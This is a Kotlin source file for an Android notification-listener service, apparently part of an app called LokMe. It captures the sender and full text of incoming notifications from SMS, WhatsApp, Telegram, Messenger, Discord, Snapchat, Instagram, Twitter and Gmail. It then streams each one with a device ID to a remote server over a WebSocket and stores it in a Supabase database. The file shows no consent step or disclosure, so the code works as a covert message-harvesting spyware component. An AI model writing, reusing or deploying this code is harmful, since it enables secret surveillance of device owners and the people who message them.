package com.lokme.service

import android.app.Notification
import android.content.Intent
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.lokme.network.WsClient
import com.lokme.network.SupabaseClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import org.json.JSONObject

class NotificationCaptureService : NotificationListenerService() {

    companion object {
        private const val TAG = "NotifCapture"
        var isRunning = false
            private set
    }

    private var wsClient: WsClient? = null
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var deviceId: String = ""

    private val capturePackages = setOf(
        "com.android.mms",
        "com.google.android.apps.messaging",
        "com.whatsapp",
        "com.whatsapp.w4b",
        "org.telegram.messenger",
        "org.telegram.messenger.web",
        "com.samsung.android.messaging",
        "com.viber.voip",
        "com.facebook.orca",
        "com.discord",
        "com.snapchat.android",
        "com.instagram.android",
        "com.twitter.android",
        "com.google.android.gm"
    )

    private val smsKeywords = setOf("message", "sms", "mms", "text", "chat", "inbox")

    override fun onListenerConnected() {
        super.onListenerConnected()
        isRunning = true
        Log.d(TAG, "Notification listener connected")
        connectWebSocket()
    }

    override fun onListenerDisconnected() {
        isRunning = false
        Log.d(TAG, "Notification listener disconnected")
        try { wsClient?.close() } catch (_: Exception) {}
        super.onListenerDisconnected()
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        if (sbn.isOngoing) return

        val packageName = sbn.packageName
        if (!shouldCapture(packageName)) return

        val notification = sbn.notification ?: return
        val extras = notification.extras ?: return

        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
        val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()
        val subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString()

        val displayText = bigText ?: text
        if (displayText.isBlank()) return

        val appName = resolveAppName(packageName)
        val isGroupSummary = (notification.flags and Notification.FLAG_GROUP_SUMMARY) != 0
        if (isGroupSummary) return

        val sender = title
        val message = displayText

        Log.d(TAG, "Captured: [$appName] $sender: ${message.take(80)}")

        val json = JSONObject().apply {
            put("type", "notification")
            put("device_id", deviceId)
            put("app_package", packageName)
            put("app_name", appName)
            put("sender", sender)
            put("message", message)
            put("sub_text", subText ?: "")
            put("timestamp", sbn.postTime)
        }

        try {
            wsClient?.sendText(json.toString())
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send via WS: ${e.message}")
        }

        scope.launch {
            try {
                SupabaseClient.insertNotification(
                    context = this@NotificationCaptureService,
                    deviceId = deviceId,
                    packageName = packageName,
                    appName = appName,
                    sender = sender,
                    message = message,
                    timestamp = sbn.postTime
                )
            } catch (e: Exception) {
                Log.e(TAG, "Failed to insert to Supabase: ${e.message}")
            }
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}

    private fun shouldCapture(packageName: String): Boolean {
        if (capturePackages.contains(packageName)) return true
        if (packageName.contains("mms") || packageName.contains("sms")) return true
        if (packageName.contains("whatsapp")) return true
        return false
    }

    private fun resolveAppName(packageName: String): String {
        return when {
            packageName.contains("whatsapp.w4b") -> "WhatsApp Business"
            packageName.contains("whatsapp") -> "WhatsApp"
            packageName.contains("mms") || packageName.contains("sms") -> "Messages"
            packageName.contains("telegram") -> "Telegram"
            packageName.contains("viber") -> "Viber"
            packageName.contains("facebook.orca") -> "Messenger"
            packageName.contains("discord") -> "Discord"
            packageName.contains("snapchat") -> "Snapchat"
            packageName.contains("instagram") -> "Instagram"
            packageName.contains("twitter") -> "Twitter/X"
            packageName.contains("gmail") || packageName.contains("gm") -> "Gmail"
            else -> packageName
        }
    }

    private fun connectWebSocket() {
        try {
            deviceId = SupabaseClient.getDeviceId(this)
            wsClient = WsClient(
                url = com.lokme.LokMeApp.SERVER_URL,
                onCommand = { _, _, _ -> },
                onConnected = {
                    Log.d(TAG, "WS connected for notifications")
                },
                onDisconnected = {
                    Log.d(TAG, "WS disconnected")
                }
            )
            wsClient?.connect(deviceId)
        } catch (e: Exception) {
            Log.e(TAG, "WS connect failed: ${e.message}")
        }
    }

    override fun onDestroy() {
        isRunning = false
        try { wsClient?.close() } catch (_: Exception) {}
        scope.cancel()
        super.onDestroy()
    }
}
